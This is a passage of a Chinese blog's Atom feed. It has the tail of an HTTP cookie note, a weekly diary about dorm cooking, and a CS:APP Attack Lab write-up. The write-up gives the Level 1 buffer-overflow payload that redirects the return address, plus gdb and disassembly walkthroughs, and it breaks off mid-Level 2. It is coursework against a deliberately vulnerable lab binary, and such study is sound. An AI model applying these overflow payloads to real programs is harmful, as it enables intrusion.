Apache</span><br><span class="line">＜Set-Cookie: sid&#x3D;1342077140226724; path&#x3D;&#x2F;; expires&#x3D;Wed,10-Oct-12 07:12:20 GMT＞</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文2</span><br><span class="line">GET &#x2F;image&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br><span class="line">Cookie: sid&#x3D;1342077140226724</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;TCP/IP 基础&lt;/li&gt;
&lt;li&gt;HTTP简介&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="驭龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/"/>
    
      <category term="Web开发" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/HTTP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-4</title>
    <link href="http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/"/>
    <id>http://yoursite.com/2020/07/31/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-4/</id>
    <published>2020-07-31T11:42:02.000Z</published>
    <updated>2020-07-31T12:56:57.028Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月20日~7月26日</p><p>宿舍小厨</p><a id="more"></a><h2 id="宿舍小厨"><a href="#宿舍小厨" class="headerlink" title="宿舍小厨"></a>宿舍小厨</h2><p>上周买的食材陆陆续续到了, 即将开始与导员宿管的躲猫猫生活. 由于我手残下单鸡蛋的时候多下了一份,现在我对着80个鸡蛋欲哭无泪… </p><p>整理下目前的装备与食材.</p><ol><li>锅*2, 一个口深适合煮汤, 一个口浅适合煎东西;</li><li>一个蒸蛋器</li><li>面板, 擀面杖, 刀具餐具</li></ol><p>食材:</p><ol><li>鸡蛋</li><li>紫薯</li><li>黑小麦全麦粉</li><li>鸡肉肠, 鸡胸肉,金枪鱼肉罐头</li><li>燕麦麦片</li><li>荞麦面</li><li>全麦面包</li></ol><h3 id="鸡蛋羹"><a href="#鸡蛋羹" class="headerlink" title="鸡蛋羹"></a>鸡蛋羹</h3><p>试图使用蒸蛋器蒸出鸡蛋羹, 但是挺失败的, 尽管在网上找了很多食谱…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">鸡蛋羹做法</span><br><span class="line"></span><br><span class="line">少水蛋(质地硬)</span><br><span class="line">1. ⭐蛋:水&#x3D;1:1.5</span><br><span class="line">2. ⭐小火&gt;&gt;大火</span><br><span class="line">3. 温水&gt;凉水</span><br><span class="line">4. 电解质&gt;水        #电解质:盐&#x2F;高汤</span><br><span class="line">5. 加盖&gt;无盖        #用布反向包裹锅盖</span><br><span class="line">6. ⭐时间刚好&gt;&gt;多蒸一会</span><br><span class="line">7. ⭐凉开水&gt;&gt;自来水</span><br><span class="line"></span><br><span class="line">多水蛋(质地软)</span><br><span class="line">1. 蛋:水&#x3D;1:2 or 1:3</span><br><span class="line">2. 一定要加电解质</span><br><span class="line">3. 火候,时间相对不重要</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">1. 蒸锅上汽之后再放入</span><br><span class="line">总结自B站UP喃猫小厨房,BV1x441117r4</span><br></pre></td></tr></table></figure><p>但是总是蒸出来蜂窝蛋…</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E7%BE%B9.jpg" alt=""></p><h3 id="煎鸡蛋"><a href="#煎鸡蛋" class="headerlink" title="煎鸡蛋"></a>煎鸡蛋</h3><p>从最开始打在锅里面热一热, 到后面在少放油的情况下尽量更香, 味道好极了现在.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E8%9B%8B.jpg" alt=""></p><h3 id="什锦-燕麦-紫薯-鸡蛋-牛奶饼"><a href="#什锦-燕麦-紫薯-鸡蛋-牛奶饼" class="headerlink" title="什锦-燕麦-紫薯-鸡蛋-牛奶饼"></a>什锦-燕麦-紫薯-鸡蛋-牛奶饼</h3><p>总而言是是各种奇妙的搭配组合…</p><h4 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h4><p>两个鸡蛋不加水搅拌,加入全麦粉, 加入烤熟切块的紫薯, 放入锅中烤熟.<br>但是我总觉得这么厚的饼不太适合直接烤, 不容易烤熟…而且紫薯块太大, 翻面的时候总是支离破碎.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B4%AB%E8%96%AF%E9%A5%BC.jpg" alt=""></p><h4 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h4><p>第一次失败后决定做薄饼. 鸡蛋+麦片, 第一锅完全成了炒鸡蛋, 后续陆续放入面粉, 最终成形. 燕麦片本身的厚度使饼没有想象中那么薄, 但相比上一版好多了.</p><p>味道其实不太行, 由于只加入了少许盐, 基本没有任何滋味, 食之无味.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC0.5.jpg" alt=""></p><h4 id="尝试3"><a href="#尝试3" class="headerlink" title="尝试3"></a>尝试3</h4><p>将燕麦片牛奶泡一晚, 次日打入鸡蛋搅拌, 放油下锅. 煎出来了奇形怪状的小饼干(疑似), 依旧没什么味道.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%85%8E%E9%A5%BC.jpg" alt=""></p><h4 id="尝试4"><a href="#尝试4" class="headerlink" title="尝试4"></a>尝试4</h4><p>直接鸡蛋液打匀分次倒入铺满锅底即可. 本来想加入切丁的鸡肉肠, 但是鸡蛋饼太薄肉丁根本镶嵌不上去, 最后变成了鸡蛋饼+炒肉丁.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%B8%A1%E8%9B%8B%E9%A5%BC%E8%82%89%E4%B8%81.jpg" alt=""></p><h3 id="紫薯燕麦粥"><a href="#紫薯燕麦粥" class="headerlink" title="紫薯燕麦粥"></a>紫薯燕麦粥</h3><p>紫薯蒸熟切块, 加水熬制30min,加入麦片熬煮20min, 香浓的燕麦紫薯粥就做好了.</p><p>粥越煮越稠, 我中间还以为自己水加多了去了点, 结果最后快熬干了orz.</p><p>水量没过紫薯上表面1-2公分.</p><p>味道还可以, 口中直呼烫烫烫</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E7%B2%A5.jpg" alt=""></p><h4 id="荞麦面-煎鸡蛋-炒金枪鱼肉"><a href="#荞麦面-煎鸡蛋-炒金枪鱼肉" class="headerlink" title="荞麦面+煎鸡蛋+炒金枪鱼肉"></a>荞麦面+煎鸡蛋+炒金枪鱼肉</h4><p>好吧这个没啥技术含量..看图吧</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%83%E7%9A%84/%E9%9D%A2.jpg" alt=""></p><h3 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h3><p>千里之行始于足下, 疫情期间也是看着其他人都化身大厨. 一直想开始却迟迟没有动身. 在学校尝试着开始自己做菜做饭才发现其实没有想象中那么困难, 没有锅碗瓢盆就想办法解决, 没有食材就京东天猫冷链, 缺少绿叶菜就多买水果补充维生素. 天下是有难易乎? 为之, 则难者亦易也.</p><p>还有就是对任何事情都不能等闲视之, 哪怕是简单的鸡蛋羹, 小学三年级在家里面拿微波炉轻松搞定的东西换了厨具做的依旧很糟糕. 煎鸡蛋放多少油? 做饼的面水比例是多少才不粘锅有能均匀铺开? 听到什么声音说明是火候太过了? 好多细节都是没有实操的情况下光靠别人的转述学不到的. 就像这几天在学校招新群里讨论的家长, 自己其实根本不了解行业情况, 道听途说地从别人的谈论, 亲戚朋友的个例中断定专业的优劣. 纸上得来终觉浅,绝知此事要躬行啊.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/ai.png" alt=""></p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟着宗主任去招新群里面答疑打白工, 每天都能碰见各种神奇的家长, 常面一度十分欢乐</p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3><p>完全搞定数电+计组</p><p>检查牙齿</p><p>购买装备&amp;爬山</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月20日~7月26日&lt;/p&gt;
&lt;p&gt;宿舍小厨&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab笔记3:Attack</title>
    <link href="http://yoursite.com/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/"/>
    <id>http://yoursite.com/2020/07/24/CSAPP-Lab%E7%AC%94%E8%AE%B03-Attack/</id>
    <published>2020-07-24T13:19:56.084Z</published>
    <updated>2020-08-01T10:17:26.503Z</updated>
    
    <content type="html"><![CDATA[<p>这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记</p><p>攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.</p><p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p><p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li>准备工作</li><li>题目说明<ol><li>Hex2raw 工具讲解</li><li>Byte Codes生成s</li></ol></li><li>题解: CTARGET <ol><li>Level1</li><li>Level2</li><li>Level3</li></ol></li><li>题解: RTARGET <ol><li>Gadget Farm 的使用</li><li>RLevel2</li></ol></li><li>后记</li></ol><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>本实验在教材中只对应了两小节的内容, 讲座也仅有Lec 9 , 需要大量补充学习.</p><p>请一定要在 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">官网下载</a> 并阅读 attack.pdf</p><h2 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h2><p>默认你已经阅读过教材的 3.10 部分</p><p>本题包括两部分, Ctarget与Rarget. 第一部分是利用缓冲区溢出以及代码注入技术进行攻击; 第二部分是利用面向返回编程方法对代码执行进行控制.</p><h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>本题需要你实现编写一个 txt 文件, 必须仅有十六进制数字与空格组成. 通过Hex2raw 工具将该文件转为二进制文件filename 再进行下一步.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用</span><br><span class="line">.&#x2F;ctarget -i filename -q</span><br><span class="line">或者</span><br><span class="line">.&#x2F;rtarget -i filename -q</span><br></pre></td></tr></table></figure><p> 其中 <code>-i</code>指令表示通过文件输入, <code>-q</code>表示脱网使用. 如果你也是自学者, 必须每次执行都加上这个参数.</p><p>cookie 是每个CMU学生的一个身份识别码. 如果你是自学者, cookie应该都是0x59b997fa, 这串数字会在解题中扮演一定的角色.</p><h3 id="A-Hex2raw-工具讲解"><a href="#A-Hex2raw-工具讲解" class="headerlink" title="A:Hex2raw 工具讲解"></a>A:Hex2raw 工具讲解</h3><p>由 <code>in.txt</code>文件转为二进制文件<code>out</code>需要执行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;hex2raw &lt;in.txt &gt; out</span><br></pre></td></tr></table></figure><h3 id="B-ByteCodes生成"><a href="#B-ByteCodes生成" class="headerlink" title="B:ByteCodes生成"></a>B:ByteCodes生成</h3><p>众所周知, 汇编代码是与机器的字节码一一对应的, 那么如果由汇编代码转化为字节编码呢? 我们只需要先撰写汇编代码文件 <code>example.s</code> , 使用 gcc 将其编译, 再将其反编译为中间文件即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c example.s</span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure><p>打开 example.d 即可看见对应的机器码了.</p><h2 id="题解-CTARGET"><a href="#题解-CTARGET" class="headerlink" title="题解: CTARGET"></a>题解: CTARGET</h2><p>我们首先明确一下我们要干什么. 假设你已经阅读过教材 3.10.3 小结, 你应该知道我们的目标是利用缓冲区溢出来使得函数返回时返回至另外的,出乎意料的, 由我们(攻击者)提供的函数地址上. 基本的原理不在这里多说.</p><p>下面的叙述均基于 CTARGET  为背景.</p><h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a><strong>Level1</strong></h3><h4 id="test函数"><a href="#test函数" class="headerlink" title="test函数"></a>test函数</h4><p>这个函数是我们将攻击的代码. 我们通过 <code>getbuf</code> 函数输入一串字符, 理论上正常返回时会返回整型 <code>1</code> 储存在 <code>val</code>中 并打印, 退出. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test 函数的C语言表述</span></span><br><span class="line"><span class="number">1</span><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> val;</span><br><span class="line">val = getbuf();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来观察汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;test 函数的汇编表述</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">    0x0000000000401968 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">    0x000000000040196c &lt;+4&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401971 &lt;+9&gt;:callq  0x4017a8 &lt;getbuf&gt;</span><br><span class="line">    0x0000000000401976 &lt;+14&gt;:mov    %eax,%edx</span><br><span class="line">    0x0000000000401978 &lt;+16&gt;:mov    $0x403188,%esi</span><br><span class="line">    0x000000000040197d &lt;+21&gt;:mov    $0x1,%edi</span><br><span class="line">    0x0000000000401982 &lt;+26&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401987 &lt;+31&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x000000000040198c &lt;+36&gt;:add    $0x8,%rsp</span><br><span class="line">    0x0000000000401990 &lt;+40&gt;:retq</span><br></pre></td></tr></table></figure><p>我们注意&lt;+9&gt; 这一行, <code>callq</code> 函数的操作对象是一个地址, 目前这个地址是指向到 <code>getbuf</code>函数</p><p>在<code>getbuf</code>结束后, 应当返回到下一个地址, 即0x401976 , 称为原地址. </p><blockquote><p>事实上, 当我们在使用<code>callq</code>某个函数的时候, 下一条指令的地址(即上面提到的原地址) 会被push进栈中. 换言之, 当被调用函数结束, 执行 <code>retq</code>指令时, 是读取栈顶的元素作为跳转的地址. 在正常情况下就会跳转至原地址, 程序继续运行.</p></blockquote><p>我们的目标就是替换掉栈顶的原地址, 将其修改为我们期望转到的 <code>touch1</code>函数的开始地址, 称为目标地址.</p><p>于是任务变成了:</p><ol><li>找到堆栈中原地址的储存位置</li><li>确定目标地址的地址</li><li>将原地址替换为目标地址</li></ol><h4 id="getbuf-函数"><a href="#getbuf-函数" class="headerlink" title="getbuf 函数"></a>getbuf 函数</h4><p>我们可以看到它的C代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getbuf 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">GETs(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先的问题是, 我们需要知道这个缓冲区设置有多长? .我们照例查看其汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;getbuf()</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:retq</span><br></pre></td></tr></table></figure><p>我们注意到在代码开始处, 堆栈扩充了 0x28 个大小. </p><p>这说明缓冲区大小即为0x28</p><blockquote><p>BUFF_SIZE 大小应该是与缓冲区是两个概念.</p><p>例如 教材3.10小节的代码. 实际上分配的字符数组为 <code>buf[8]</code>, 但是体现在汇编代码中就变成了<code>subq $24,%rsp</code> , 此处SIZE应该是8 , 而缓冲区大小则是 0x24.</p></blockquote><p>在整个过程中栈的变化是这样的:</p><blockquote><p>假设在test函数的<code>callq</code>语句调用之前, 栈顶指针<code>$rsp</code> 为 0x666600, 当前执行语句 <code>$rip</code> 为0x401971</p><ol><li>调用<code>callq</code>语句, 将下一条语句( 原地址, 0x0401976) 推入栈中, 即0x666600处, 栈指针 <code>$rsp</code>  变为0x666601</li><li>进入<code>getbuf</code>语句, 在<code>0x4017a8</code>处分配了0x28个栈, 此时栈顶指针为0x666629</li><li><code>getbuf</code>函数正常运行. 直到读入过量字符数组数据时, 将0x666600处的原地址覆盖为目标地址 ,此时栈顶依旧为0x666629</li><li>继续运行至0x4017b9处, 收回栈空间, 此时栈顶又变为0x666601</li><li><code>retq</code>语句, 取栈顶元素0x666600处的地址 (已经被覆盖成目标地址了) 并跳转. 即达到我们的目的.</li></ol><p>嗯……应该不会有人疑惑上一步栈顶不是0x666601为什么取0x666600的元素吧…</p><p>因为栈指针是指向栈顶下一个地址的…</p></blockquote><p>不妨使用gdb的查看指令检验一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;在 +12 设置一个断点</span><br><span class="line">&#x2F;&#x2F;事先输入的字符串为 &quot;abcdef&quot;</span><br><span class="line">(gdb) print (char*) ($rsp)</span><br><span class="line">$1 &#x3D; 0x5561dc78 &quot;abcdef&quot;</span><br><span class="line">&#x2F;&#x2F;可以看出, 堆栈的起始位置即储存了输入的字符串</span><br><span class="line"></span><br><span class="line">(gdb) x&#x2F;a ($rsp+0x28) </span><br><span class="line">0x5561dca0:0x401976 &lt;test+14&gt;</span><br><span class="line">&#x2F;&#x2F;可以看出, 当我们试图查看 ($rsp+0x28) 储存的地址时, 发现正好时test+14的地址, 也就是我们的原地址.</span><br></pre></td></tr></table></figure><p>那么我们现在只需要使用目标地址替换原地址即可.</p><h4 id="touch1-函数"><a href="#touch1-函数" class="headerlink" title="touch1 函数"></a>touch1 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;touch1 反汇编</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>显然目标地址就是 <code>0x4017c0</code></p><p>因此, 我们应当输入的数字如下:</p><blockquote><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>00 00 00 00 00 00 00 00 00 00 </p><p>c0 17 40 00 00 00 00 00 00 00 </p></blockquote><p>上面的内容不能直接在<code>ctarget</code>运行时输入, 而要使用 <code>Hex2raw</code>工具处理. 具体请参看上面的  <code>Hex2raw</code> 讲解部分.</p><p>我们将上述材料存储在文件<code>in.txt</code>内, 并使用 <code>Hex2raw</code>工具将其转化为 二进制 文件并输入. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell输入</span><br><span class="line">.&#x2F;hex2raw  &lt;in.txt&gt; out</span><br><span class="line">.&#x2F;ctarget -i out -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure><p>说明我们已经过了第一关</p><hr><h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><p>第二题的背景依旧是test函数. 除了将getbuf函数中的返回地址改为touch2函数的地址外, 还需要将注入的字符串作为代码运行. 相对复杂.</p><p>我们先来看touch2函数</p><h4 id="touch2-函数"><a href="#touch2-函数" class="headerlink" title="touch2 函数"></a>touch2 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//touch2 函数的C语言表述</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (val == cookie)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val); </span><br><span class="line">      validate(<span class="number">2</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>,val); </span><br><span class="line">      fail(<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 可见, touch2函数中会进行参数val与你的cookie进行比较, 当相同时才认为你通关. 接着看touch2的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;touch2 函数的汇编表述</span><br><span class="line">Dump of assembler code for function touch2:</span><br><span class="line">    0x00000000004017ec &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">    0x00000000004017f0 &lt;+4&gt;:mov    %edi,%edx</span><br><span class="line">    0x00000000004017f2 &lt;+6&gt;:movl   $0x2,0x202ce0(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">    0x00000000004017fc &lt;+16&gt;:cmp    0x202ce2(%rip),%edi        # 0x6044e4 &lt;cookie&gt;</span><br><span class="line">    0x0000000000401802 &lt;+22&gt;:jne    0x401824 &lt;touch2+56&gt;</span><br><span class="line">    0x0000000000401804 &lt;+24&gt;:mov    $0x4030e8,%esi</span><br><span class="line">    0x0000000000401809 &lt;+29&gt;:mov    $0x1,%edi</span><br><span class="line">    0x000000000040180e &lt;+34&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401813 &lt;+39&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401818 &lt;+44&gt;:mov    $0x2,%edi</span><br><span class="line">    0x000000000040181d &lt;+49&gt;:callq  0x401c8d &lt;validate&gt;</span><br><span class="line">    0x0000000000401822 &lt;+54&gt;:jmp    0x401842 &lt;touch2+86&gt;</span><br><span class="line">    0x0000000000401824 &lt;+56&gt;:mov    $0x403110,%esi</span><br><span class="line">    0x0000000000401829 &lt;+61&gt;:mov    $0x1,%edi</span><br><span class="line">    0x000000000040182e &lt;+66&gt;:mov    $0x0,%eax</span><br><span class="line">    0x0000000000401833 &lt;+71&gt;:callq  0x400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">    0x0000000000401838 &lt;+76&gt;:mov    $0x2,%edi</span><br><span class="line">    0x000000000040183d &lt;+81&gt;:callq  0x401d4f &lt;fail&gt;</span><br><span class="line">    0x0000000000401842 &lt;+86&gt;:mov    $0x0,%edi</span><br><span class="line">    0x0000000000401847 &lt;+91&gt;:callq  0x400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>这里注意一下 +4 行. <code>%edi</code> 还记得吗? 是默认的传入函数的第一个参数. 也就是说, 我们要在调用touch2之前, 将 <code>%edi</code>寄存器的值设置为我们的cookie. 如果只是类似上一题中的代码跳转的话, 我们没有办法对寄存器进行实际的修改, 